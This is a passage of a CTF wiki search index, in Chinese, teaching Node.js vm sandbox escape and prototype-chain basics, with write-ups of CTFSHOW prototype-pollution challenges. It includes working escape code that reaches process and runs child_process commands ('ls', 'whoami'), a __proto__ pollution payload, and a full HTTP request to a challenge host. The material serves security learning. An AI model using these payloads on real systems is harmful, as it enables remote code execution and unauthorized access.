\u770b\u4e0b\u7f51\u9875\u7aef\u5728\u7ebf\u6267\u884c\u7ed3\u679c\uff0c\u5b8c\u7f8e\u563f\u563f \u56e0\u6b64\u6211\u4eec\u53ea\u8981\u80fd\u5728\u6c99\u76d2\u73af\u5883\u4e0b\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u80fd\u83b7\u53d6\u5168\u5c40\u7684 Function\uff0c\u5c31\u80fd\u901a\u8fc7\u5b83\u6765\u6267\u884c\u4ee3\u7801 CTF\u9898\u76ee(BUU\u4e0a\u6709\u73af\u5883) \u00b6 2020 HUFUCTFweb just_escape \u00b6 [GKCTF2020]EZ\u4e09\u5251\u5ba2-EzNode \u00b6 \u53c2\u8003\u6587\u7ae0 \u00b6 NodeJS\u6c99\u7bb1\u9003\u9038\u5206\u6790( https://www.anquanke.com/post/id/166747 ) \u5b98\u65b9API\uff08 http://nodejs.cn/api/vm.html \uff09 \u51f9\u51f8\u5b9e\u9a8c\u5ba4\uff08 https://aotu.io/notes/2020/10/28/node-sandbox-escape-analysis/ \uff09 \u5173\u4e8ejavascript:nodejs-\u6c99\u76d2\u9003\u9038\u5206\u6790\uff08 https://lequ7.com/guan-yu-javascriptnodejs-sha-he-tao-yi-fen-xi.html \uff09 NPM\u9177\u5e93\uff1avm2\uff0c\u5b89\u5168\u7684\u6c99\u7bb1\u73af\u5883\uff08 https://segmentfault.com/a/1190000012672620 \uff09","title":"NodeJs\u6c99\u76d2\u9003\u9038\u5206\u6790\u53ca\u539f\u578b\u94fe\u7684\u7b80\u5355\u5b66\u4e60"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#nodejs","text":"","title":"NodeJs\u6c99\u76d2\u9003\u9038\u5206\u6790\u53ca\u539f\u578b\u94fe\u7684\u7b80\u5355\u5b66\u4e60"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#vm","text":"node.js \u91cc\u63d0\u4f9b\u4e86 vm \u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8ba9\u4f60\u5728\u6267\u884c\u4ee3\u7801\u65f6\u5019\u9694\u79bb\u5f53\u524d\u7684\u6267\u884c\u73af\u5883\uff0c\u907f\u514d\u88ab\u6076\u610f\u4ee3\u7801\u653b\u51fb\u3002 vm \u6a21\u5757\u53ef\u5728 V8 \u865a\u62df\u673a\u4e0a\u4e0b\u6587\u4e2d\u7f16\u8bd1\u548c\u8fd0\u884c\u4ee3\u7801\u3002 \u6ce8\u610f\u7684\u662f\uff1a vm \u6a21\u5757\u4e0d\u662f\u5b89\u5168\u7684\u673a\u5236\u3002 \u4e0d\u8981\u4f7f\u7528\u5b83\u6765\u8fd0\u884c\u4e0d\u53d7\u4fe1\u4efb\u7684\u4ee3\u7801\u3002","title":"VM\u7b80\u4ecb"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#vm_1","text":"\u5b98\u65b9\u6587\u6863\u539f\u8bdd\uff1a \u4e00\u4e2a\u5e38\u89c1\u7684\u7528\u4f8b\u662f\u5728\u4e0d\u540c\u7684 V8 \u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4ee3\u7801\u3002 \u8fd9\u610f\u5473\u7740\u88ab\u8c03\u7528\u7684\u4ee3\u7801\u4e0e\u8c03\u7528\u7684\u4ee3\u7801\u5177\u6709\u4e0d\u540c\u7684\u5168\u5c40\u5bf9\u8c61\u3002 \u53ef\u4ee5\u901a\u8fc7\u4f7f\u5bf9\u8c61 \u4e0a\u4e0b\u6587\u9694\u79bb\u5316 \u6765\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002 \u88ab\u8c03\u7528\u7684\u4ee3\u7801\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u4efb\u4f55\u5c5e\u6027\u90fd\u89c6\u4e3a\u5168\u5c40\u53d8\u91cf\u3002 \u7531\u8c03\u7528\u7684\u4ee3\u7801\u5f15\u8d77\u7684\u5bf9\u5168\u5c40\u53d8\u91cf\u7684\u4efb\u4f55\u66f4\u6539\u90fd\u5c06\u4f1a\u53cd\u6620\u5728\u4e0a\u4e0b\u6587\u5bf9\u8c61\u4e2d\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50 const vm = require ( 'vm' ); const x = 1 ; const context = { x : 2 }; vm . createContext ( context ); // \u521b\u5efa\u4e0a\u4e0b\u6587\u9694\u79bb\u5316\u5bf9\u8c61\u3002 const code = 'x += 40; var y = 17;' ; // `x` and `y` \u662f\u4e0a\u4e0b\u6587\u4e2d\u7684\u5168\u5c40\u53d8\u91cf\u3002 // \u6700\u521d\uff0cx \u7684\u503c\u4e3a 2\uff0c\u56e0\u4e3a\u8fd9\u662f context.x \u7684\u503c\u3002 vm . runInContext ( code , context ); console . log ( context . x ); // 42 console . log ( context . y ); // 17 console . log ( x ); // 1; y \u6ca1\u6709\u5b9a\u4e49\u3002 \u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5b8c\u7f8e\u7684\u8be0\u91ca\u4e86\u4e0b\u9762\u8fd9\u5f20\u56fe\u7684\u5185\u5bb9(\u5f88\u660e\u663e\u7684\u662f\u6c99\u76d2\u73af\u5883\u4ee3\u7801\u53ea\u80fd\u8bfb\u53d6 VM \u4e0a\u4e0b\u6587\u7684\u6570\u636e) \u6240\u6709\u7528 Node.js \u6240\u8fd0\u884c\u7684 JavaScript \u4ee3\u7801\u90fd\u662f\u5728\u4e00\u4e2a\u201c\u4e0a\u4e0b\u6587\u201d\u7684\u4f5c\u7528\u57df\u4e2d\u88ab\u6267\u884c\u7684\u3002 \u5b98\u65b9\u6587\u6863\u5f53\u4e2d\u6709\u8fd9\u6837\u4e00\u53e5\u8bdd \u5728 V8 \u4e2d\uff0c\u4e00\u4e2a\u4e0a\u4e0b\u6587\u662f\u4e00\u4e2a\u6267\u884c\u73af\u5883\uff0c\u5b83\u5141\u8bb8\u5206\u79bb\u7684\uff0c\u65e0\u5173\u7684 JavaScript \u5e94\u7528\u5728\u4e00\u4e2a V8 \u7684\u5355\u4f8b\u4e2d\u88ab\u8fd0\u884c\u3002 \u5fc5\u987b\u660e\u786e\u5730\u6307\u5b9a\u7528\u4e8e\u8fd0\u884c\u6240\u6709 JavaScript \u4ee3\u7801\u7684\u4e0a\u4e0b\u6587\u3002 \u5f53\u6211\u4eec\u53bb\u8c03\u7528 vm.createContext() \u65b9\u6cd5\u65f6\uff0c contextObject \u53c2\u6570\uff08\u5982\u679c contextObject \u4e3a undefined \uff0c\u5219\u4e3a\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\uff09\u5728\u5185\u90e8\u4e0e V8 \u4e0a\u4e0b\u6587\u7684\u65b0\u5b9e\u4f8b\u76f8\u5173\u8054\u3002 \u8be5 V8 \u4e0a\u4e0b\u6587\u63d0\u4f9b\u4e86\u4f7f\u7528 vm \u6a21\u5757\u7684\u65b9\u6cd5\u8fd0\u884c\u7684 code \u4ee5\u53ca\u53ef\u5728\u5176\u4e2d\u8fd0\u884c\u7684\u9694\u79bb\u7684\u5168\u5c40\u73af\u5883\u3002 \u6c99\u76d2\u6267\u884c\u4e0a\u4e0b\u6587\u662f\u9694\u79bb\u7684\uff0c\u4f46\u53ef\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u83b7\u53d6\u5230\u6c99\u76d2\u5916\u7684 Function\uff0c\u4ece\u800c\u5b8c\u6210\u9003\u9038\uff0c\u62ff\u5230\u5168\u5c40\u6570\u636e\uff0c\u793a\u4f8b\u56fe\u5982\u4e0b\uff1a \u5f53\u7136\u60f3\u8981\u7406\u89e3\u8fd8\u662f\u5f97\u6709\u4e00\u70b9\u539f\u578b\u94fe\u7684\u77e5\u8bc6\uff0c\u5b66\u4e60\u4e86\u89e3\u8fd9\u4e2a\u4e0d\u4ec5\u4ec5\u5bf9\u4eca\u5929\u7684\u77e5\u8bc6\u6709\u597d\u5904\uff0c\u4e5f\u5bf9\u4e4b\u540e\u539f\u578b\u94fe\u6c61\u67d3\u7684\u5b66\u4e60\u4e5f\u662f\u5fc5\u987b","title":"VM\u6a21\u5757"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#_1","text":"","title":"\u539f\u578b\u94fe"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#_2","text":"\u6211\u4eec\u9996\u5148\u5f97\u77e5\u9053\uff08\u5b98\u65b9\u6587\u6863\uff09 JavaScript \u5bf9\u8c61\u662f\u52a8\u6001\u7684\u5c5e\u6027\u201c\u5305\u201d\uff08\u6307\u5176\u81ea\u5df1\u7684\u5c5e\u6027\uff09\u3002JavaScript \u5bf9\u8c61\u6709\u4e00\u4e2a\u6307\u5411\u4e00\u4e2a\u539f\u578b\u5bf9\u8c61\u7684\u94fe\u3002\u5f53\u8bd5\u56fe\u8bbf\u95ee\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u65f6\uff0c\u5b83\u4e0d\u4ec5\u4ec5\u5728\u8be5\u5bf9\u8c61\u4e0a\u641c\u5bfb\uff0c\u8fd8\u4f1a\u641c\u5bfb\u8be5\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u4ee5\u53ca\u8be5\u5bf9\u8c61\u7684\u539f\u578b\u7684\u539f\u578b\uff0c\u4f9d\u6b21\u5c42\u5c42\u5411\u4e0a\u641c\u7d22\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u540d\u5b57\u5339\u914d\u7684\u5c5e\u6027\u6216\u5230\u8fbe\u539f\u578b\u94fe\u7684\u672b\u5c3e\u3002 \u9996\u5148\u6211\u4eec\u6765\u770b\u770b\u5b98\u65b9\u7684\u6848\u4f8b\uff0c\u8fd9\u4e2a\u8bf7\u8ba4\u771f\u770b\uff0c\u8ba4\u771f\u5206\u6790\u5b66\u4e60\uff0c\u8fd9\u4e0e\u4e4b\u540e\u7684\u539f\u578b\u6c61\u67d3\u7684\u5b66\u4e60\u5bc6\u4e0d\u53ef\u5206 // \u4ece\u4e00\u4e2a\u51fd\u6570\u91cc\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61o\uff0c\u5b83\u81ea\u8eab\u62e5\u6709\u5c5e\u6027a\u548cb\u7684\uff1a let f = function () { this . a = 1 ; this . b = 2 ; } let o = new f (); // {a: 1, b: 2} // \u5728f\u51fd\u6570\u7684\u539f\u578b\u4e0a\u5b9a\u4e49\u5c5e\u6027 f . prototype . b = 3 ; f . prototype . c = 4 ; // \u6ce8\u610f\uff1a\u4e0d\u8981\u5728 f \u51fd\u6570\u7684\u539f\u578b\u4e0a\u76f4\u63a5\u5b9a\u4e49 f.prototype = {b:3,c:4};\u8fd9\u6837\u4f1a\u76f4\u63a5\u6253\u7834\u539f\u578b\u94fe // o.[[Prototype]] \u6709\u5c5e\u6027 b \u548c c // (\u5176\u5b9e\u5c31\u662f o.__proto__ \u6216\u8005 o.constructor.prototype) // o.[[Prototype]].[[Prototype]].[[Prototype]]\u662fnull // \u8fd9\u5c31\u662f\u539f\u578b\u94fe\u7684\u672b\u5c3e\uff0c\u5373 null\uff0c // \u6839\u636e\u5b9a\u4e49\uff0cnull \u5c31\u662f\u6ca1\u6709 [[Prototype]]\u3002 // \u7efc\u4e0a\uff0c\u6574\u4e2a\u539f\u578b\u94fe\u5982\u4e0b: // {a:1, b:2} ---> {b:3, c:4} ---> Object.prototype---> null console . log ( o . a ); // 1 // a\u662fo\u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u662f\u7684\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u4e3a 1 console . log ( o . b ); // 2 // b\u662fo\u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u662f\u7684\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u4e3a 2 // \u539f\u578b\u4e0a\u4e5f\u6709\u4e00\u4e2a'b'\u5c5e\u6027\uff0c\u4f46\u662f\u5b83\u4e0d\u4f1a\u88ab\u8bbf\u95ee\u5230\u3002 // \u8fd9\u79cd\u60c5\u51b5\u88ab\u79f0\u4e3a\"\u5c5e\u6027\u906e\u853d (property shadowing)\" ----- \u8fd9\u4e00\u70b9\u5f88\u91cd\u8981\u6211\u4eec\u539f\u578b\u94fe\u6c61\u67d3\u7684\u65f6\u5019\u7ecf\u5e38\u4e5f\u662f\u5229\u7528\u4e86\u8fd9\u4e2a\u7279\u6027\uff0c\u5404\u79cd\u6a21\u677f\u5f15\u64ce\u7684\u539f\u578b\u6c61\u67d3\u4f60\u61c2\u7684 console . log ( o . c ); // 4 // c\u662fo\u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u4e0d\u662f\uff0c\u90a3\u770b\u770b\u5b83\u7684\u539f\u578b\u4e0a\u6709\u6ca1\u6709 // c\u662fo.[[Prototype]]\u7684\u5c5e\u6027\u5417\uff1f\u662f\u7684\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u4e3a 4 console . log ( o . d ); // undefined // d \u662f o \u7684\u81ea\u8eab\u5c5e\u6027\u5417\uff1f\u4e0d\u662f\uff0c\u90a3\u770b\u770b\u5b83\u7684\u539f\u578b\u4e0a\u6709\u6ca1\u6709 // d \u662f o.[[Prototype]] \u7684\u5c5e\u6027\u5417\uff1f\u4e0d\u662f\uff0c\u90a3\u770b\u770b\u5b83\u7684\u539f\u578b\u4e0a\u6709\u6ca1\u6709 // o.[[Prototype]].[[Prototype]] \u4e3a null\uff0c\u505c\u6b62\u641c\u7d22 // \u627e\u4e0d\u5230 d \u5c5e\u6027\uff0c\u8fd4\u56de undefined \u5f53\u7ee7\u627f\u7684\u51fd\u6570\u88ab\u8c03\u7528\u65f6\uff0c this \u6307\u5411\u7684\u662f\u5f53\u524d\u7ee7\u627f\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u7ee7\u627f\u7684\u51fd\u6570\u6240\u5728\u7684\u539f\u578b\u5bf9\u8c61 var o = { a : 2 , m : function (){ return this . a + 1 ; } }; console . log ( o . m ()); // 3 // \u5f53\u8c03\u7528 o.m \u65f6\uff0c'this' \u6307\u5411\u4e86 o. \u63a5\u4e0b\u6765\u6211\u4eec\u518d\u5b66\u4e60\u5b98\u65b9\u6587\u6863\u7684\u4e00\u6bb5\u4ee3\u7801\uff0c\u5f53\u7136\u5728\u5f00\u59cb\u4e4b\u524d\u6211\u4eec\u5f97\u77e5\u9053 \u88ab\u6784\u9020\u51fd\u6570\u521b\u5efa\u7684\u5b9e\u4f8b\u5bf9\u8c61\u7684 [[Prototype]] \u6307\u5411 func \u7684 prototype \u5c5e\u6027\u3002 Object.prototype \u5c5e\u6027\u8868\u793a Object \u7684\u539f\u578b\u5bf9\u8c61\u3002 function doSomething (){} doSomething . prototype . foo = \"bar\" ; // add a property onto the prototype var doSomeInstancing = new doSomething (); doSomeInstancing . prop = \"some value\" ; // add a property onto the object console . log ( doSomeInstancing ); \u4e0b\u9762\u662f\u7ed3\u679c { prop : \"some value\" , __proto__ : { foo : \"bar\" , constructor : \u0192 doSomething (), __proto__ : { constructor : \u0192 Object (), hasOwnProperty : \u0192 hasOwnProperty (), isPrototypeOf : \u0192 isPrototypeOf (), propertyIsEnumerable : \u0192 propertyIsEnumerable (), toLocaleString : \u0192 toLocaleString (), toString : \u0192 toString (), valueOf : \u0192 valueOf () } } } \u663e\u800c\u6613\u89c1\uff0c doSomeInstancing \u4e2d\u7684 __proto__ \u662f doSomething.prototype \uff0c\u63a5\u7740\u6211\u4eec\u5c1d\u8bd5\u8fd0\u884c console.log( doSomeInstancing.foo ); \u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\u4e3a bar \uff0c\u8fd9\u5c31\u544a\u8bc9\u6211\u4eec doSomeInstancing \u4e2d\u7684 __proto__ \u662f doSomething.prototype . \u63a5\u4e0b\u6765\u6211\u4eec\u63a5\u7740\u8fd0\u884c console . log ( doSomething . prototype ); console . log ( doSomeInstancing ); \u5f97\u5230 { constructor : \u0192 doSomething (), __proto__ : { constructor : \u0192 Object (), hasOwnProperty : \u0192 hasOwnProperty (), isPrototypeOf : \u0192 isPrototypeOf (), propertyIsEnumerable : \u0192 propertyIsEnumerable (), toLocaleString : \u0192 toLocaleString (), toString : \u0192 toString (), valueOf : \u0192 valueOf () } } { foo : \"bar\" , constructor : \u0192 doSomething (), __proto__ : { constructor : \u0192 Object (), hasOwnProperty : \u0192 hasOwnProperty (), isPrototypeOf : \u0192 isPrototypeOf (), propertyIsEnumerable : \u0192 propertyIsEnumerable (), toLocaleString : \u0192 toLocaleString (), toString : \u0192 toString (), valueOf : \u0192 valueOf () } } \u8fd9\u544a\u8bc9\u4e86\u6211\u4eec\u4ec0\u4e48 doSomeInstancing \u7684 __proto__ \u540c doSomething.prototype \u56e0\u6b64\u5f53\u6211\u4eec\u8bbf\u95ee doSomeInstancing \u4e2d\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u6d4f\u89c8\u5668\u9996\u5148\u4f1a\u67e5\u770b doSomeInstancing \u4e2d\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u5c5e\u6027\u3002 \u5982\u679c doSomeInstancing \u4e0d\u5305\u542b\u5c5e\u6027\u4fe1\u606f, \u90a3\u4e48\u6d4f\u89c8\u5668\u4f1a\u5728 doSomeInstancing \u7684 __proto__ \u4e2d\u8fdb\u884c\u67e5\u627e \u5982\u679c\u5c5e\u6027\u5728 doSomeInstancing \u7684 __proto__ \u4e2d\u67e5\u627e\u5230\uff0c\u5219\u8fd4\u56de\u5b83\u3002 \u5982\u679c doSomeInstancing \u4e2d __proto__ \u4e0d\u5177\u6709\u8be5\u5c5e\u6027\uff0c\u5219\u68c0\u67e5 doSomeInstancing \u7684 __proto__ \u7684 __proto__ \u662f\u5426\u5177\u6709\u8be5\u5c5e\u6027\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4efb\u4f55\u51fd\u6570\u7684\u539f\u578b\u5c5e\u6027 __proto__ \u90fd\u662f window.Object.prototype. \u56e0\u6b64, \u901a\u8fc7 doSomeInstancing \u7684 __proto__ \u7684 __proto__ ( \u4e5f\u5c31\u662f Object.prototype ) \u6765\u67e5\u627e\u8981\u641c\u7d22\u7684\u5c5e\u6027\u3002\u5982\u679c\u518d\u627e\u4e0d\u5230 \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6d4f\u89c8\u5668\u5219\u4f1a\u65ad\u8a00\u8be5\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5e76\u7ed9\u51fa\u5c5e\u6027\u503c\u4e3a undefined \u7684\u7ed3\u8bba","title":"\u4e00\u4e9b\u5c0f\u57fa\u7840"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#_3","text":"\u9996\u5148\u770b\u4e0b\u5b98\u65b9\u793a\u4f8b const vm = require ( \"vm\" ); const ctx = {}; vm . runInNewContext ( 'this.constructor.constructor(\"return process\")().exit()' , ctx ); console . log ( \"Never gets executed.\" ); \u4e0a\u8ff0\u4ee3\u7801\u5728\u6267\u884c\u65f6\uff0c\u7a0b\u5e8f\u5728\u7b2c\u4e8c\u884c\u5c31\u76f4\u63a5\u9000\u51fa\uff0cvm\u865a\u62df\u673a\u73af\u5883\u4e2d\u7684\u4ee3\u7801\u9003\u9038\uff0c\u83b7\u5f97\u4e86\u4e3b\u7ebf\u7a0b\u7684 process \u53d8\u91cf\uff0c\u5e76\u8c03\u7528 process.exit()\uff0c\u9020\u6210\u4e3b\u7a0b\u5e8f\u975e\u6b63\u5e38\u9000\u51fa\u3002 \u5b83\u7b49\u540c\u4e8e const sandbox = this ; // \u83b7\u53d6Context const ObjectConstructor = this . constructor ; // \u83b7\u53d6 Object \u5bf9\u8c61\u6784\u9020\u51fd\u6570 const FunctionConstructor = ObjectConstructor . constructor ; // \u83b7\u53d6 Function \u5bf9\u8c61\u6784\u9020\u51fd\u6570 const myfun = FunctionConstructor ( 'return process' ); // \u6784\u9020\u4e00\u4e2a\u51fd\u6570\uff0c\u8fd4\u56deprocess\u5168\u5c40\u53d8\u91cf const process = myfun (); process . exit (); \u4ee5\u4e0a\u662f\u901a\u8fc7\u539f\u578b\u94fe\u65b9\u5f0f\u5b8c\u6210\u9003\u9038\uff0c\u5982\u679c\u5c06\u4e0a\u4e0b\u6587\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u8bbe\u7f6e\u4e3a null \u4f1a\u600e\u4e48\u505a const vm = require ( \"vm\" ); const ctx = Object . create ( null ); ctx . data = {}; vm . runInNewContext ( 'this.data.constructor.constructor(\"return process\")().exit()' , ctx ); console . log ( \"Never gets executed.\" ); \u7531\u4e8e JS \u91cc\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u90fd\u4f1a\u6307\u5411 Object.prototype\uff0c\u4e14 Object.prototype \u548c Function \u4e4b\u95f4\u662f\u76f8\u4e92\u6307\u5411\u7684\uff0c\u6240\u6709\u5bf9\u8c61\u901a\u8fc7\u539f\u578b\u94fe\u90fd\u80fd\u62ff\u5230 Function\uff0c\u6700\u7ec8\u5b8c\u6210\u6c99\u76d2\u9003\u9038\u5e76\u6267\u884c\u4ee3\u7801\u3002 \u9003\u9038\u540e\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u4ee3\u7801\u62ff\u5230 require\uff0c\u4ece\u800c\u5e76\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\u529f\u80fd const vm = require ( \"vm\" ); const ctx = { console , }; vm . runInNewContext ( ` var exec = this.constructor.constructor; var require = exec('return process.mainModule.constructor._load')(); console.log(require('child_process').execSync(\"ls\").toString()); ` , ctx ); \u770b\u4e0b\u7f51\u9875\u7aef\u5728\u7ebf\u6267\u884c\u7ed3\u679c\uff0c\u5b8c\u7f8e\u563f\u563f \u56e0\u6b64\u6211\u4eec\u53ea\u8981\u80fd\u5728\u6c99\u76d2\u73af\u5883\u4e0b\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u80fd\u83b7\u53d6\u5168\u5c40\u7684 Function\uff0c\u5c31\u80fd\u901a\u8fc7\u5b83\u6765\u6267\u884c\u4ee3\u7801","title":"\u6c99\u76d2\u9003\u9038"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#ctfbuu","text":"","title":"CTF\u9898\u76ee(BUU\u4e0a\u6709\u73af\u5883)"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#2020-hufuctfweb-just_escape","text":"","title":"2020 HUFUCTFweb just_escape"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#gkctf2020ez-eznode","text":"","title":"[GKCTF2020]EZ\u4e09\u5251\u5ba2-EzNode"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/nodejs\u6c99\u76d2\u9003\u9038/readme/#_4","text":"NodeJS\u6c99\u7bb1\u9003\u9038\u5206\u6790( https://www.anquanke.com/post/id/166747 ) \u5b98\u65b9API\uff08 http://nodejs.cn/api/vm.html \uff09 \u51f9\u51f8\u5b9e\u9a8c\u5ba4\uff08 https://aotu.io/notes/2020/10/28/node-sandbox-escape-analysis/ \uff09 \u5173\u4e8ejavascript:nodejs-\u6c99\u76d2\u9003\u9038\u5206\u6790\uff08 https://lequ7.com/guan-yu-javascriptnodejs-sha-he-tao-yi-fen-xi.html \uff09 NPM\u9177\u5e93\uff1avm2\uff0c\u5b89\u5168\u7684\u6c99\u7bb1\u73af\u5883\uff08 https://segmentfault.com/a/1190000012672620 \uff09","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/nodejs/\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb/CTFSHOW-PrototypePollutionAttack/","text":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \u00b6 Web338 \u00b6 \u9996\u5148\u4ece\u5165\u53e3\u6587\u4ef6\u770b\u8d77\uff0c app.js \uff0c\u53d1\u73b0\u4e24\u4e2a\u5173\u952e\u8def\u5f84 app . use ( '/' , indexRouter ); app . use ( '/login' , loginRouter ); \u5f53\u7136\u4e3b\u9875\u5c31\u4e0d\u7528\u770b\u4e86\uff0c\u76f4\u63a5\u770b\u5173\u952e\u90e8\u5206\uff0clogin\uff0c\u4ece\u5f53\u4e2d\u6211\u4eec\u4e0d\u96be\u5f97\u51fa\u9700\u8981\u8ba9 secert.ctfshow==='36dboy' \u5373\u53ef\u83b7\u53d6flag\uff0c\u8fd9\u91cc\u5f88\u7b80\u5355\uff0c\u539f\u578b\u94fe\u6c61\u67d3\u561b /* GET home page. */ router . post ( '/' , require ( 'body-parser' ). json (), function ( req , res , next ) { res . type ( 'html' ); var flag = 'flag_here' ; var secert = {}; var sess = req . session ; let user = {}; utils . copy ( user , req . body ); if ( secert . ctfshow === '36dboy' ){ res . end ( flag ); } else { return res . json ({ ret_code : 2 , ret_msg : '\u767b\u5f55\u5931\u8d25' + JSON . stringify ( user )}); } }); \u5176\u4e2d\u6d89\u53ca\u5230\u8fd9\u4e00\u90e8\u5206\u7684\u5229\u7528\u51fd\u6570\u5c31\u662f copy \uff0c\u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u8c03\u7528\u51fd\u6570\uff0cfor\u5faa\u73af\u904d\u5386object2\u5f53\u4e2d\u7684key(\u952e)\uff0c\u5982\u679c\u8fd9\u4e2a\u952e\u5728object1\u4e0eobject2\u5f53\u4e2d\u90fd\u5b58\u5728\uff0c\u5219\u8c03\u7528 copy(object1[key], object2[key]) ,\u5426\u5219\u8ba9 object1[key] = object2[key] function copy ( object1 , object2 ){ for ( let key in object2 ) { if ( key in object2 && key in object1 ) { copy ( object1 [ key ], object2 [ key ]) } else { object1 [ key ] = object2 [ key ] } } } \u90a3\u5982\u679c\u6211\u4eec\u8ba9 object2 \u4e3a {\"__proto__\":{\"ctfshow\":\"36dboy\"}} \u4f1a\u53d1\u751f\u4ec0\u4e48\uff08\u6ce8\u610f\u672c\u9898\u5f53\u4e2dobject1\u4e3asecret\u53d8\u91cf\uff09 \u7531\u4e8e object1\u548cobject2 \u7684\u5bf9\u8c61\u90fd\u5177\u6709\u5c5e\u6027 __proto__ ,\u8fdb\u5165if\u8bed\u53e5\u4e3atrue\uff0c\u6267\u884c copy(object1[__proto__], object2[__proto__]) \u6b64\u65f6 let key in object2 \u7684 key \u4e3a ctfshow \u5f88\u660e\u663eobject1\u5f53\u4e2d\u6ca1\u6709\uff0c\u6240\u4ee5\u8fdb\u5165else\u90e8\u5206 object1[ctfshow] = object2[ctfshow] \uff0c\u6210\u529f\u8d4b\u503c\u4e3a 36dboy Burpsuite\u53d1\u9001\u8bf7\u6c42\u5305\u5373\u53ef\u83b7\u53d6flag POST /login HTTP/1.1 Host: 4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show Content-Length: 34 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Content-Type: application/json Origin: http://4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show Referer: http://4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: UM_distinctid=176b20985423e8-07d414625df175-3323765-144000-176b209854358f Connection: close {\"__proto__\":{\"ctfshow\":\"36dboy\"}} Web339 \u00b6 \u8fd9\u9053\u9898\u5f00\u59cb\u9ebb\u70e6\u8d77\u6765\u4e86\uff0c\u5148\u6765\u5206\u6790\u601d\u8def\uff0c\u9996\u5148\u5217\u51fa\u672c\u9898\u5229\u7528\u6240\u9700\u8981\u7684\u5173\u952e\u4ee3\u7801 \u9996\u5148\u662flogin.js /* GET home page. */ router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow===flag){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '\u767b\u5f55\u5931\u8d25'+JSON.stringify(user)}); } }); \u4e4b\u540e\u662fapi.js var express = require('express'); var router = express.Router(); var utils = require('../utils/common'); // var query = \"return global.process.mainModule.constructor._load('child_process').execSync('whoami');\"; /* GET home page. */ router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); module.exports = router; \u6211\u4eec\u53d1\u73b0\u5728api.js\u5f53\u4e2d Function\u91cc\u7684query\u53d8\u91cf\u6ca1\u6709\u88ab\u5f15\u7528 